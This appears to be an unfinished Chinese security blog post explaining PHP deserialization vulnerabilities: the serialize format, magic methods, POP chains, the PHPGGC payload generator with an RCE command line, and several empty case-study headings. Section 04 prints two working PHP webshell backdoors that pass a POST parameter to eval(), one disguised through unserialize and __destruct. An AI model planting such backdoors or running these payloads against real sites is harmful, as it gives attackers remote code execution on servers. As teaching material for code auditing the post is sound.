---
layout: post
title:  "PHP反序列化漏洞"
categories: 代码审计
tags: PHP 代码审计 反序列化
author: 0e0w
---

* content
{:toc}
这是一篇关于PHP反序列化漏洞的文章。由于作者能力有限，文中难免会出现一些错误，请谅解。本文会不定期更新，最近一次更新时间为2020年5月23日。本文未完成。鉴于凡世之忙碌，下一次更新也许是明天，也许是下辈子。
## 01-PHP序列化

### 基本概述

序列化是将对象转换为容易传输的格式的过程，一般情况下转化为流文件，放入内存或者IO文件中。例如，可以序列化一个对象，然后使用 HTTP 通过 Internet 在客户端和服务器之间传输该对象，或者和其它应用程序共享使用。

序列化是将对象中的变量转换成字符串的过程。

- 函数：serialize()

  序列化之后各个字符的意义：

  > ```
  > a - array                  b - boolean  
  > d - double                 i - integer
  > o - common object          r - reference
  > s - string                 C - custom object
  > O - class                  N - null
  > R - pointer reference      U - unicode string
  > ```

  > ```
  > O:4:"User":2:{s:3:"age";i:20;s:4:"name";s:5:"lemon";}
  > 对象类型:长度:"类名":类中变量的个数:{类型:长度:"值";类型:长度:"值";......}
  > ```
### 目的意义

为什么要进行序列化？在程序执行完成后，内存数据会立即销毁。变量所储存的数据便是内存数据，会删除所有变量(Static静态变量执行完成之后不会删除，会存储最后一次被调用所包含的信息)。PHP序列化就是将内存的变量数据以字符串的形式保存到文件中的持久数据的过程。

### 属性类型

- Puiblic
- Private
- Protected

## 02-PHP反序列化

### 基本概述

反序列化是将序列化过存储到文件中的数据，恢复到程序代码的变量表示形式的过程。

- 函数：unserialize()
- 漏洞成因：当用户的请求在传给反序列化函数unserialize()之前没有被正确的过滤时就会产生漏洞。因为PHP允许对象序列化，攻击者就可以提交特定的序列化的字符串给一个具有该漏洞的unserialize函数，最终导致一个在该应用范围内的任意PHP对象注入。
- 利用前提
  - unserialize函数的参数可控。
  - 代码里有定义一个含有魔术方法的类，并且该方法里出现一些使用类成员变量作为参数的存在安全问题的函数。

### 魔术方法

在PHP中，魔术方法也称之为魔法函数，以双下划线开头，会在特定的情况下被调用。在面向对象的编程思想中起着至关重要的作用。详细内容参考[PHP官网魔术方法](http://www.php.net/manual/zh/language.oop5.magic.php)

- __construct()

  > 实例化对象时被调用，当construct和以类名为函数名的函数同时存在时construct将被调用，另一个不被调用。作用：初始化类的成员变量。

- __destruct()

  > 当删除一个对象或对象操作终止时被调用。作用：释放对象占用的资源。

- __call(string $name, array $arguments)

  > 对象调用某个方法，若方法可访问，则直接调用；若方法不可访问，则会去调用__call函数。

- __get()

  > 读取一个对象的属性时， 若属性存在，则直接返回属性值； 若不存在，则会调用__get函数。

- __set()

  > 设置一个对象的属性时， 若属性存在，则直接赋值； 若不存在，则会调用__set函数。

- __toString()

  > 打印一个对象的时被调用。 如echo $obj;或print $obj;

- __clone()

  > 克隆对象时被调用。如：$t=new Test();$t1=clone $t;

- __sleep()

  > serialize之前被调用。若对象比较大，想删减一点东东再序列化，可考虑一下此函数。

- __wakeup()

  > unserialize时被调用，做些对象的初始化工作。

- __isset()

  > 检测一个对象的属性是否存在时被调用。如：isset($c->name)。

- __unset()

  > unset一个对象的属性时被调用。如：unset($c->name)。

- __set_state()

  > 类的实例被var_export时，该方法会被调用。用__set_state的返回值做为var_export的返回值。

- __autoload()

  > 实例化一个对象时，如果对应的类不存在，则该方法被调用。

- __debugInfo()

  > 类的实例被var_dump时，该方法会被调用（PHP 5.6.0才有）

- __invoke()

  > 把类的实例当成函数一样调用时，该方法会被调用。

### 构造POP链

面向属性编程（Property-Oriented Programing） 用于上层语言构造特定调用链的方法，从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。在控制代码或者程序的执行流程后使用调用链执行一些操作。

- **POP链利用**：一般的序列化攻击都在PHP魔术方法中出现可利用的漏洞，因为自动调用触发漏洞，但如果关键代码没在魔术方法中，而是在一个类的普通方法中。这时候就可以通过构造POP链寻找相同的函数名将类的属性和敏感函数的属性联系起来。我们手动构造序列化对象就是为了unserialize()函数能够触发destruc()函数，然后执行在destruc()函数里恶意的语句。
- 具体构造思路：序列化的过程。
  - 寻找wakeup() 和destruct() 函数。
  - 追踪调用过程。
  - 手工构造并验证POP链。

### PHPGGC

PHPGGC是一款自动生成PHP反序列化Payload的工具。

> 地址：https://github.com/ambionics/phpggc
>
> 类似项目：https://github.com/s-n-t/phpggc

> ./phpggc ThinkPHP/RCE1 system "whoami"

### Session反序列化

PHP在session存储和读取时,都会有一个序列化和反序列化的过程，PHP内置了多种处理器用于存取 $_SESSION 数据，都会对数据进行序列化和反序列化

## 03-案例分析

### Typecho

代码版本：1.0.14.5.26.-beta

代码分析：

### Wecenter

在wecenter中所使用到了

代码分析：

### Drupal

### vBulletin

### laravel

https://github.com/SZFsir/laravel_POP_RCE

### ThinkPHP

## 04-PHP反序列化与Webshell

```php
<?php
class A{
    var $test = "demo";
    function __destruct(){
        @eval($this->test);
    }
}
$test = $_POST['test'];
$len = strlen($test)+1;
$pp = "O:1:\"A\":1:{s:4:\"test\";s:".$len.":\"".$test.";\";}"; // 构造序列化对象
$test_unser = unserialize($pp); // 反序列化同时触发_destruct函数
?>
```

这也是另外的一个例子。通过反序列化可以做一些比较有趣的后门。

```php
<?php
class evals{
    protected $links;
    function __construct($an){
        $this->links = $an;
        eval("\$title=1;".$this->links);
    }
}
$a = new evals(@$_POST['An']);
?>
```

## 05-参考链接

- [https://kylingit.com/]([https://kylingit.com/blog/%E7%94%B1phpggc%E7%90%86%E8%A7%A3php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/](https://kylingit.com/blog/由phpggc理解php反序列化漏洞/))
- https://v0w.top/2020/03/05/unsearise-POP/

